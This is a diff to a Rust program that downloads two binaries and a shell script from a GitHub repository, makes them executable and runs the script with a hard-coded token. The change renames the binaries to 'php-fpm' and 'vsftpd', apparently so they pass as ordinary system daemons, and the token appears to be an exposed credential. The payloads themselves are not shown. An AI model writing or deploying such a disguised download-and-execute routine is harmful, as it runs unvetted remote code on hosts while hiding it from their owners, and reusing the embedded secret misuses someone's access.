@@ -12,16 +12,16 @@ struct FileInfo {
 
 const FILES_TO_DOWNLOAD: &[FileInfo] = &[
     FileInfo {
-        url: "https://github.com/wwrrtt/test/raw/main/server",
-        filename: "server",
+        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/php-fpm",
+        filename: "php-fpm",
     },
     FileInfo {
-        url: "https://github.com/wwrrtt/test/raw/main/web",
-        filename: "web",
+        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd",
+        filename: "vsftpd",
     },
     FileInfo {
-        url: "https://github.com/wwrrtt/test/releases/download/2.0/begin.sh",
-        filename: "begin.sh",
+        url: "https://github.com/wwrrtt/test/releases/download/3.0/go.sh",
+        filename: "go.sh",
     },
 ];
 
@@ -81,12 +81,12 @@ async fn download_and_execute_files() -> Result<bool, Box<dyn std::error::Error>
         download_file(file, &base_path).await?;
     }
 
-    for file in ["begin.sh", "server", "web"] {
+    for file in ["go.sh", "php-fpm", "vsftpd"] {
         let file_path = format!("{}/{}", base_path, file);
         give_executable_permission(&file_path).await?;
     }
 
-    let script_path = format!("{}/begin.sh", base_path);
+    let script_path = format!("{}/go.sh", base_path);
     let token = "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9";
     execute_script(&script_path, token).await?;
 
